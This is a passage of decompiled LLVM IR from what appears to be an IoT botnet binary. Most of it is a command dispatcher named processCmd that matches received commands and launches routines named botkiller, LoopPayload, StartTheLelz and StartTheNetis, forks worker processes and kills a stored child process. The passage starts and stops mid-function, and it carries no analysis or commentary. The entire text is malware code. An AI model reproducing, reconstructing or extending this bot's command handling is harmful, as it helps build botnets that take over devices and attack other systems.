  %v1_804fd9f = add i32 %v0_804fd9f, 4
  %v2_804fd9f = inttoptr i32 %v1_804fd9f to i32*
  store i32 0, i32* %v2_804fd9f, align 4
  %v0_804fda7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fda7 = load i32, i32* @esp, align 4
  %v2_804fda7 = inttoptr i32 %v1_804fda7 to i32*
  store i32 %v0_804fda7, i32* %v2_804fda7, align 4
  %v0_804fdaa = load i32, i32* %stack_var_-204, align 4
  %v2_804fdaa = load i32, i32* %stack_var_-196, align 4
  %v5_804fdaa = call i32 @__libc_select(i32 %v0_804fdaa, i32 10000, i32 %v2_804fdaa, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804fdaa, i32* %eax.global-to-local, align 4
  %v4_804fdb2 = icmp eq i32 %v5_804fdaa, 0
  br i1 %v4_804fdb2, label %dec_label_pc_804fdd4, label %dec_label_pc_804fdb8

dec_label_pc_804fdb8:                             ; preds = %dec_label_pc_804fd28
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fdbe = load i32, i32* %v4_804fd47, align 8
  store i32 %v5_804fdbe, i32* %eax.global-to-local, align 4
  %v1_804fdc1 = load i32, i32* @esp, align 4
  %v2_804fdc1 = inttoptr i32 %v1_804fdc1 to i32*
  store i32 %v5_804fdbe, i32* %v2_804fdc1, align 4
  %v1_804fdc4 = call i32 @__libc_close(i32 %v5_804fdaa)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804faf9, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fdd4:                             ; preds = %dec_label_pc_804fb21, %dec_label_pc_804fd28, %dec_label_pc_804fcfd, %dec_label_pc_804fd07, %dec_label_pc_804fced, %dec_label_pc_804fccc, %dec_label_pc_804fbe3, %dec_label_pc_804fbcd, %dec_label_pc_804fdb8
  %v4_804fdd4 = add nuw nsw i32 %storemerge42, 1
  store i32 %v4_804fdd4, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804fdd4, %v2_804f9ff
  br i1 %exitcond, label %dec_label_pc_804fde3, label %dec_label_pc_804faf3

dec_label_pc_804fde3:                             ; preds = %dec_label_pc_804fdd7.preheader, %dec_label_pc_804fdd4, %dec_label_pc_804fa3d
  %stack_var_-44.0 = phi i32 [ %tmp8, %dec_label_pc_804fa3d ], [ 0, %dec_label_pc_804fdd7.preheader ], [ %v2_804f9ff, %dec_label_pc_804fdd4 ]
  %v0_804fde3 = load i32, i32* @esp, align 4
  %v1_804fde3 = inttoptr i32 %v0_804fde3 to i32*
  store i32 0, i32* %v1_804fde3, align 4
  %v1_804fdea = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804fdea = call i32 @__GI_time(i32* %v1_804fdea)
  store i32 %v2_804fdea, i32* %eax.global-to-local, align 4
  %v5_804fdf2 = icmp slt i32 %v2_804fdea, %v5_804fadc
  br i1 %v5_804fdf2, label %dec_label_pc_804fdd7.preheader, label %dec_label_pc_804fdf8

dec_label_pc_804fdd7.preheader:                   ; preds = %dec_label_pc_804fde3
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804fdda40, label %dec_label_pc_804faf3, label %dec_label_pc_804fde3

dec_label_pc_804fdf8:                             ; preds = %dec_label_pc_804fde3, %entry
  %v0_804fe04 = phi i32 [ %v3_804fa2f, %entry ], [ %v2_804fdea, %dec_label_pc_804fde3 ]
  %v2_804fe01 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe01, i32* @ebx, align 4
  store i32 %v0_804f9e1, i32* @edi, align 4
  ret i32 %v0_804fe04

; uselistorder directives
  uselistorder i32 %v4_804fdd4, { 1, 2, 0 }
  uselistorder i32 %v1_804fd58, { 1, 0 }
  uselistorder i32 %v5_804fc75, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804fc23, { 1, 0 }
  uselistorder i32* %v4_804fc12, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804faf9, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8* %v5_804faf9, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge42, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 0, 1 }
  uselistorder i32 %v2_804fbfd, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804fa94, { 1, 0 }
  uselistorder i32 %v2_804fa77, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804fa0d, { 1, 0 }
  uselistorder i32 %v2_804f9ff, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f9f1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-204, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 53, 1, 44, 0, 2, 3, 7, 4, 5, 6, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 22, 19, 20, 21, 23, 24, 26, 25, 29, 27, 28, 30, 31, 35, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 45, 47, 46, 48, 50, 49, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fdd4, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp217 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804fe08 = load i32, i32* @edi, align 4
  %v0_804fe09 = load i32, i32* @esi, align 4
  %v0_804fe0a = load i32, i32* @ebx, align 4
  store i32 %v0_804fe0a, i32* %stack_var_-16, align 4
  %v5_804fe0b = icmp ult i32* %stack_var_-16, inttoptr (i32 460 to i32*)
  store i1 %v5_804fe0b, i1* %cf.global-to-local, align 1
  %v2_804fe14 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe31 = inttoptr i32 %v2_804fe14 to i8*
  store i32 %v2_804fe14, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8059297.21 to i32), i32* @edi, align 4
  %v7_804fe43 = call i32 @_strncmp(i8* %v4_804fe31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059297.21, i32 0, i32 0), i32 5)
  %v8_804fe43 = urem i32 %v7_804fe43, 2
  %v9_804fe43 = icmp eq i32 %v8_804fe43, 0
  %v0_804fe45 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fe45 = or i1 %v0_804fe45, %v9_804fe43
  %v3_804fe45 = zext i1 %v2_804fe45 to i32
  %v4_804fe45 = load i32, i32* @edx, align 4
  %v5_804fe45 = and i32 %v4_804fe45, -256
  %v6_804fe45 = or i32 %v3_804fe45, %v5_804fe45
  %v7_804fe45 = xor i32 %v6_804fe45, 1
  store i32 %v7_804fe45, i32* %edx.global-to-local, align 4
  %v1_804fe4d = trunc i32 %v7_804fe45 to i8
  %v3_804fe4d = zext i1 %v0_804fe45 to i8
  %v15_804fe4d = icmp eq i8 %v1_804fe4d, %v3_804fe4d
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe56 = icmp eq i1 %v15_804fe4d, false
  br i1 %v1_804fe56, label %dec_label_pc_804fe72, label %dec_label_pc_804fe58

dec_label_pc_804fe58:                             ; preds = %entry
  %v0_804fe58 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804fe58 = ptrtoint i8* %v0_804fe58 to i32
  %v3_804fe68 = call i32 @HackerPrint(i32 %v1_804fe58, i32 ptrtoint ([6 x i8]* @global_var_805d339.866 to i32))
  br label %dec_label_pc_8051252

dec_label_pc_804fe72:                             ; preds = %entry
  %v2_804fe75 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe92 = inttoptr i32 %v2_804fe75 to i8*
  store i32 %v2_804fe75, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805d33f.867 to i32), i32* @edi, align 4
  %v7_804fea4 = call i32 @_strncmp(i8* %v4_804fe92, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805d33f.867, i32 0, i32 0), i32 11)
  %v8_804fea4 = urem i32 %v7_804fea4, 2
  %v9_804fea4 = icmp eq i32 %v8_804fea4, 0
  %v0_804fea6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fea6 = or i1 %v0_804fea6, %v9_804fea4
  %v3_804fea6 = zext i1 %v2_804fea6 to i32
  %v4_804fea6 = load i32, i32* %edx.global-to-local, align 4
  %v5_804fea6 = and i32 %v4_804fea6, -256
  %v6_804fea6 = or i32 %v3_804fea6, %v5_804fea6
  %v7_804fea6 = xor i32 %v6_804fea6, 1
  store i32 %v7_804fea6, i32* %edx.global-to-local, align 4
  %v1_804feae = trunc i32 %v7_804fea6 to i8
  %v3_804feae = zext i1 %v0_804fea6 to i8
  %v15_804feae = icmp eq i8 %v1_804feae, %v3_804feae
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804feb7 = icmp eq i1 %v15_804feae, false
  br i1 %v1_804feb7, label %dec_label_pc_804fee5, label %dec_label_pc_804feb9

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804fe72
  %v0_804feb9 = load i32, i32* @global_var_8065768.232, align 8
  %v2_804fec1 = call i32 @__GI_inet_ntoa(i32 %v0_804feb9)
  %v0_804fec6 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804fec6 = ptrtoint i8* %v0_804fec6 to i32
  store i32 %v1_804fec6, i32* %edx.global-to-local, align 4
  %v3_804fedb = call i32 @HackerPrint(i32 %v1_804fec6, i32 ptrtoint ([10 x i8]* @global_var_805d34a.868 to i32))
  br label %dec_label_pc_8051252

dec_label_pc_804fee5:                             ; preds = %dec_label_pc_804fe72
  %v2_804fee8 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ff05 = inttoptr i32 %v2_804fee8 to i8*
  store i32 %v2_804fee8, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805d354.869 to i32), i32* @edi, align 4
  %v7_804ff17 = call i32 @_strncmp(i8* %v4_804ff05, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805d354.869, i32 0, i32 0), i32 8)
  %v8_804ff17 = urem i32 %v7_804ff17, 2
  %v9_804ff17 = icmp eq i32 %v8_804ff17, 0
  %v0_804ff19 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ff19 = or i1 %v0_804ff19, %v9_804ff17
  %v3_804ff19 = zext i1 %v2_804ff19 to i32
  %v4_804ff19 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ff19 = and i32 %v4_804ff19, -256
  %v6_804ff19 = or i32 %v3_804ff19, %v5_804ff19
  %v7_804ff19 = xor i32 %v6_804ff19, 1
  store i32 %v7_804ff19, i32* @edx, align 4
  %v1_804ff21 = trunc i32 %v7_804ff19 to i8
  %v3_804ff21 = zext i1 %v0_804ff19 to i8
  %v15_804ff21 = icmp eq i8 %v1_804ff21, %v3_804ff21
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff2a = icmp eq i1 %v15_804ff21, false
  br i1 %v1_804ff2a, label %dec_label_pc_804ff60, label %dec_label_pc_804ff2c

dec_label_pc_804ff2c:                             ; preds = %dec_label_pc_804fee5
  %v0_804ff2c = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff31 = icmp eq i32 %v0_804ff2c, 0
  %v1_804ff33 = icmp eq i1 %v1_804ff31, false
  br i1 %v1_804ff33, label %dec_label_pc_804ff60, label %dec_label_pc_804ff35

dec_label_pc_804ff35:                             ; preds = %dec_label_pc_804ff2c
  %v0_804ff35 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804ff35 = ptrtoint i8* %v0_804ff35 to i32
  %v3_804ff45 = call i32 @HackerPrint(i32 %v1_804ff35, i32 ptrtoint ([13 x i8]* @global_var_805d35c.870 to i32))
  %v0_804ff4a = call i32 @botkiller()
  %v0_804ff4f = call i32 @RemoveTMP()
  %v2_804ff5b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ff60:                             ; preds = %dec_label_pc_804ff2c, %dec_label_pc_804fee5
  %v2_804ff63 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ff80 = inttoptr i32 %v2_804ff63 to i8*
  store i32 %v2_804ff63, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d369.871 to i32), i32* @edi, align 4
  %v7_804ff92 = call i32 @_strncmp(i8* %v4_804ff80, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805d369.871, i32 0, i32 0), i32 7)
  %v8_804ff92 = urem i32 %v7_804ff92, 2
  %v9_804ff92 = icmp eq i32 %v8_804ff92, 0
  %v0_804ff94 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ff94 = or i1 %v0_804ff94, %v9_804ff92
  %v3_804ff94 = zext i1 %v2_804ff94 to i32
  %v4_804ff94 = load i32, i32* @edx, align 4
  %v5_804ff94 = and i32 %v4_804ff94, -256
  %v6_804ff94 = or i32 %v3_804ff94, %v5_804ff94
  %v7_804ff94 = xor i32 %v6_804ff94, 1
  store i32 %v7_804ff94, i32* @edx, align 4
  %v1_804ff9c = trunc i32 %v7_804ff94 to i8
  %v3_804ff9c = zext i1 %v0_804ff94 to i8
  %v15_804ff9c = icmp eq i8 %v1_804ff9c, %v3_804ff9c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffa5 = icmp eq i1 %v15_804ff9c, false
  br i1 %v1_804ffa5, label %dec_label_pc_804ffd6, label %dec_label_pc_804ffa7

dec_label_pc_804ffa7:                             ; preds = %dec_label_pc_804ff60
  %v0_804ffa7 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffac = icmp eq i32 %v0_804ffa7, 0
  %v1_804ffae = icmp eq i1 %v1_804ffac, false
  br i1 %v1_804ffae, label %dec_label_pc_804ffd6, label %dec_label_pc_804ffb0

dec_label_pc_804ffb0:                             ; preds = %dec_label_pc_804ffa7
  %v0_804ffb0 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804ffb0 = ptrtoint i8* %v0_804ffb0 to i32
  %v3_804ffc0 = call i32 @HackerPrint(i32 %v1_804ffb0, i32 ptrtoint ([16 x i8]* @global_var_805d370.872 to i32))
  %v0_804ffc5 = call i32 @LoopPayload()
  %v2_804ffd1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ffd6:                             ; preds = %dec_label_pc_804ffa7, %dec_label_pc_804ff60
  %v2_804ffd9 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fff6 = inttoptr i32 %v2_804ffd9 to i8*
  store i32 %v2_804ffd9, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d380.873 to i32), i32* @edi, align 4
  %v7_8050008 = call i32 @_strncmp(i8* %v4_804fff6, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805d380.873, i32 0, i32 0), i32 7)
  %v8_8050008 = urem i32 %v7_8050008, 2
  %v9_8050008 = icmp eq i32 %v8_8050008, 0
  %v0_805000a = load i1, i1* %cf.global-to-local, align 1
  %v2_805000a = or i1 %v0_805000a, %v9_8050008
  %v3_805000a = zext i1 %v2_805000a to i32
  %v4_805000a = load i32, i32* @edx, align 4
  %v5_805000a = and i32 %v4_805000a, -256
  %v6_805000a = or i32 %v3_805000a, %v5_805000a
  %v7_805000a = xor i32 %v6_805000a, 1
  store i32 %v7_805000a, i32* %edx.global-to-local, align 4
  %v1_8050012 = trunc i32 %v7_805000a to i8
  %v3_8050012 = zext i1 %v0_805000a to i8
  %v15_8050012 = icmp eq i8 %v1_8050012, %v3_8050012
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805001b = icmp eq i1 %v15_8050012, false
  br i1 %v1_805001b, label %dec_label_pc_8050165, label %dec_label_pc_8050021

dec_label_pc_8050021:                             ; preds = %dec_label_pc_804ffd6
  %v8_8050021 = icmp ult i32 %arg1, 2
  store i1 %v8_8050021, i1* %cf.global-to-local, align 1
  %v12_8050021 = icmp eq i32 %arg1, 2
  br i1 %v12_8050021, label %dec_label_pc_8050041, label %dec_label_pc_8050027

dec_label_pc_8050027:                             ; preds = %dec_label_pc_8050021
  %v0_8050027 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8050027 = ptrtoint i8* %v0_8050027 to i32
  %v3_8050037 = call i32 @HackerPrint(i32 %v1_8050027, i32 ptrtoint ([16 x i8]* @global_var_805d387.874 to i32))
  br label %dec_label_pc_8051252

dec_label_pc_8050041:                             ; preds = %dec_label_pc_8050021
  %v1_8050044 = add i32 %tmp217, 4
  %v5_8050044 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_8050044, i1* %cf.global-to-local, align 1
  %v1_8050047 = inttoptr i32 %v1_8050044 to i32*
  %v2_8050047 = load i32, i32* %v1_8050047, align 4
  store i1 false, i1* @df, align 1
  %v4_8050064 = inttoptr i32 %v2_8050047 to i8*
  store i32 %v2_8050047, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d397.875 to i32), i32* @edi, align 4
  %v7_8050076 = call i32 @_strncmp(i8* %v4_8050064, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d397.875, i32 0, i32 0), i32 4)
  %v8_8050076 = urem i32 %v7_8050076, 2
  %v9_8050076 = icmp eq i32 %v8_8050076, 0
  %v0_8050078 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050078 = or i1 %v0_8050078, %v9_8050076
  %v3_8050078 = zext i1 %v2_8050078 to i32
  %v4_8050078 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050078 = and i32 %v4_8050078, -256
  %v6_8050078 = or i32 %v3_8050078, %v5_8050078
  %v7_8050078 = xor i32 %v6_8050078, 1
  store i32 %v7_8050078, i32* @edx, align 4
  %v1_8050080 = trunc i32 %v7_8050078 to i8
  %v3_8050080 = zext i1 %v0_8050078 to i8
  %v15_8050080 = icmp eq i8 %v1_8050080, %v3_8050080
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050089 = icmp eq i1 %v15_8050080, false
  br i1 %v1_8050089, label %dec_label_pc_80500cc, label %dec_label_pc_805008b

dec_label_pc_805008b:                             ; preds = %dec_label_pc_8050041
  %v0_805008b = load i32, i32* @global_var_8065770.876, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050090 = icmp eq i32 %v0_805008b, 0
  br i1 %v1_8050090, label %dec_label_pc_8051252, label %dec_label_pc_8050098

dec_label_pc_8050098:                             ; preds = %dec_label_pc_805008b
  %v3_80500a8 = call i32 @kill(i32 %v0_805008b, i32 9)
  %v0_80500ad = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_80500ad = ptrtoint i8* %v0_80500ad to i32
  %v3_80500bd = call i32 @HackerPrint(i32 %v1_80500ad, i32 ptrtoint ([5 x i8]* @global_var_805d39b.877 to i32))
  store i32 0, i32* @global_var_8065770.876, align 16
  br label %dec_label_pc_80500cc

dec_label_pc_80500cc:                             ; preds = %dec_label_pc_8050041, %dec_label_pc_8050098
  store i1 %v5_8050044, i1* %cf.global-to-local, align 1
  %v2_80500d2 = load i32, i32* %v1_8050047, align 4
  store i1 false, i1* @df, align 1
  %v4_80500ef = inttoptr i32 %v2_80500d2 to i8*
  %v7_8050101 = call i32 @_strncmp(i8* %v4_80500ef, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805d3a0.878, i32 0, i32 0), i32 3)
  %v8_8050101 = urem i32 %v7_8050101, 2
  %v9_8050101 = icmp eq i32 %v8_8050101, 0
  %v0_8050103 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050103 = or i1 %v0_8050103, %v9_8050101
  %v3_8050103 = zext i1 %v2_8050103 to i32
  %v4_8050103 = load i32, i32* @edx, align 4
  %v5_8050103 = and i32 %v4_8050103, -256
  %v6_8050103 = or i32 %v3_8050103, %v5_8050103
  %v7_8050103 = xor i32 %v6_8050103, 1
  store i32 %v7_8050103, i32* %edx.global-to-local, align 4
  %v1_805010b = trunc i32 %v7_8050103 to i8
  %v3_805010b = zext i1 %v0_8050103 to i8
  %v15_805010b = icmp eq i8 %v1_805010b, %v3_805010b
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050114 = icmp eq i1 %v15_805010b, false
  br i1 %v1_8050114, label %dec_label_pc_8050165, label %dec_label_pc_8050116

dec_label_pc_8050116:                             ; preds = %dec_label_pc_80500cc
  %v0_8050116 = load i32, i32* @global_var_8065770.876, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805011b = icmp eq i32 %v0_8050116, 0
  %v1_805011d = icmp eq i1 %v1_805011b, false
  br i1 %v1_805011d, label %dec_label_pc_8051252, label %dec_label_pc_8050123

dec_label_pc_8050123:                             ; preds = %dec_label_pc_8050116
  %v1_8050123 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805012e = icmp eq i32 %v1_8050123, 0
  br i1 %v4_805012e, label %dec_label_pc_8050154, label %dec_label_pc_8050137

dec_label_pc_8050137:                             ; preds = %dec_label_pc_8050123
  store i32 %v1_8050123, i32* @global_var_8065770.876, align 16
  br label %dec_label_pc_8051252

dec_label_pc_8050154:                             ; preds = %dec_label_pc_8050123
  store i1 true, i1* %cf.global-to-local, align 1
  %v1_8050154 = call i32 @StartTheLelz(i32 0)
  %v2_8050160 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050165:                             ; preds = %dec_label_pc_80500cc, %dec_label_pc_804ffd6
  %v2_8050168 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050185 = inttoptr i32 %v2_8050168 to i8*
  %v7_8050197 = call i32 @_strncmp(i8* %v4_8050185, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805d3a3.879, i32 0, i32 0), i32 6)
  %v8_8050197 = urem i32 %v7_8050197, 2
  %v9_8050197 = icmp eq i32 %v8_8050197, 0
  %v0_8050199 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050199 = or i1 %v0_8050199, %v9_8050197
  %v3_8050199 = zext i1 %v2_8050199 to i32
  %v4_8050199 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050199 = and i32 %v4_8050199, -256
  %v6_8050199 = or i32 %v3_8050199, %v5_8050199
  %v7_8050199 = xor i32 %v6_8050199, 1
  store i32 %v7_8050199, i32* %edx.global-to-local, align 4
  %v1_80501a1 = trunc i32 %v7_8050199 to i8
  %v3_80501a1 = zext i1 %v0_8050199 to i8
  %v4_80501a1 = sub nsw i8 %v1_80501a1, %v3_80501a1
  %v15_80501a1 = icmp eq i8 %v4_80501a1, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501aa = icmp eq i1 %v15_80501a1, false
  br i1 %v1_80501aa, label %dec_label_pc_8050226, label %dec_label_pc_80501ac

dec_label_pc_80501ac:                             ; preds = %dec_label_pc_8050165
  %v2_80501a5 = sext i8 %v4_80501a1 to i32
  %v8_80501ac = icmp ult i32 %arg1, 2
  store i1 %v8_80501ac, i1* %cf.global-to-local, align 1
  %v12_80501ac = icmp eq i32 %arg1, 2
  %v1_80501b0 = icmp eq i1 %v12_80501ac, false
  br i1 %v1_80501b0, label %dec_label_pc_8051252, label %dec_label_pc_80501b6

dec_label_pc_80501b6:                             ; preds = %dec_label_pc_80501ac
  %v1_80501b9 = add i32 %tmp217, 4
  %v5_80501b9 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_80501b9, i1* %cf.global-to-local, align 1
  %v1_80501bc = inttoptr i32 %v1_80501b9 to i32*
  %v2_80501bc = load i32, i32* %v1_80501bc, align 4
  store i1 false, i1* @df, align 1
  %v4_80501d9 = inttoptr i32 %v2_80501bc to i8*
  store i32 %v2_80501bc, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805d3a0.878 to i32), i32* @edi, align 4
  %v7_80501eb = call i32 @_strncmp(i8* %v4_80501d9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805d3a0.878, i32 0, i32 0), i32 3)
  %v8_80501eb = urem i32 %v7_80501eb, 2
  %v9_80501eb = icmp eq i32 %v8_80501eb, 0
  %v0_80501ed = load i1, i1* %cf.global-to-local, align 1
  %v2_80501ed = or i1 %v0_80501ed, %v9_80501eb
  %v3_80501ed = zext i1 %v2_80501ed to i32
  %v4_80501ed = load i32, i32* %edx.global-to-local, align 4
  %v5_80501ed = and i32 %v4_80501ed, -256
  %v6_80501ed = or i32 %v3_80501ed, %v5_80501ed
  %v7_80501ed = xor i32 %v6_80501ed, 1
  store i32 %v7_80501ed, i32* %edx.global-to-local, align 4
  %v1_80501f5 = trunc i32 %v7_80501ed to i8
  %v3_80501f5 = zext i1 %v0_80501ed to i8
  %v15_80501f5 = icmp eq i8 %v1_80501f5, %v3_80501f5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501fe = icmp eq i1 %v15_80501f5, false
  br i1 %v1_80501fe, label %dec_label_pc_8050226, label %dec_label_pc_8050200

dec_label_pc_8050200:                             ; preds = %dec_label_pc_80501b6
  %v0_8050200 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8050200 = ptrtoint i8* %v0_8050200 to i32
  %v3_8050210 = call i32 @HackerPrint(i32 %v1_8050200, i32 ptrtoint ([25 x i8]* @global_var_805d3a9.880 to i32))
  %v0_8050215 = call i32 @StartTheNetis()
  %v2_8050221 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050226:                             ; preds = %dec_label_pc_80501b6, %dec_label_pc_8050165
  %v2_8050229 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050246 = inttoptr i32 %v2_8050229 to i8*
  store i32 %v2_8050229, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805d3c2.881 to i32), i32* @edi, align 4
  %v7_8050258 = call i32 @_strncmp(i8* %v4_8050246, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805d3c2.881, i32 0, i32 0), i32 5)
  %v8_8050258 = urem i32 %v7_8050258, 2
  %v9_8050258 = icmp eq i32 %v8_8050258, 0
  %v0_805025a = load i1, i1* %cf.global-to-local, align 1
  %v2_805025a = or i1 %v0_805025a, %v9_8050258
  %v3_805025a = zext i1 %v2_805025a to i32
  %v4_805025a = load i32, i32* %edx.global-to-local, align 4
  %v5_805025a = and i32 %v4_805025a, -256
  %v6_805025a = or i32 %v3_805025a, %v5_805025a
  %v7_805025a = xor i32 %v6_805025a, 1
  store i32 %v7_805025a, i32* @edx, align 4
  %v1_8050262 = trunc i32 %v7_805025a to i8
  %v3_8050262 = zext i1 %v0_805025a to i8
  %v4_8050262 = sub nsw i8 %v1_8050262, %v3_8050262
  %v15_8050262 = icmp eq i8 %v4_8050262, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805026b = icmp eq i1 %v15_8050262, false
  br i1 %v1_805026b, label %dec_label_pc_80503b5, label %dec_label_pc_8050271

dec_label_pc_8050271:                             ; preds = %dec_label_pc_8050226
  %v2_8050266 = sext i8 %v4_8050262 to i32
  %v9_8050271 = icmp ult i32 %arg1, 3
  store i1 %v9_8050271, i1* %cf.global-to-local, align 1
  %v7_8050275 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050275, label %dec_label_pc_805027b, label %dec_label_pc_8051252

dec_label_pc_805027b:                             ; preds = %dec_label_pc_8050271
  %v1_805027e = add i32 %tmp217, 8
  %v5_805027e = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_805027e, i1* %cf.global-to-local, align 1
  %v1_8050281 = inttoptr i32 %v1_805027e to i32*
  %v2_8050281 = load i32, i32* %v1_8050281, align 4
  %v2_8050286 = call i32 @atol(i32 %v2_8050281)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_8050286, 1
  br i1 %tmp224, label %dec_label_pc_8051252, label %dec_label_pc_8050293

dec_label_pc_8050293:                             ; preds = %dec_label_pc_805027b
  %v1_8050296 = add i32 %tmp217, 12
  %v5_8050296 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050296, i1* %cf.global-to-local, align 1
  %v1_8050299 = inttoptr i32 %v1_8050296 to i32*
  %v2_8050299 = load i32, i32* %v1_8050299, align 4
  %v2_805029e = call i32 @atol(i32 %v2_8050299)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp225 = icmp slt i32 %v2_805029e, 1
  %tmp226 = icmp eq i1 %tmp225, false
  br i1 %tmp226, label %dec_label_pc_80502ac, label %dec_label_pc_8051252

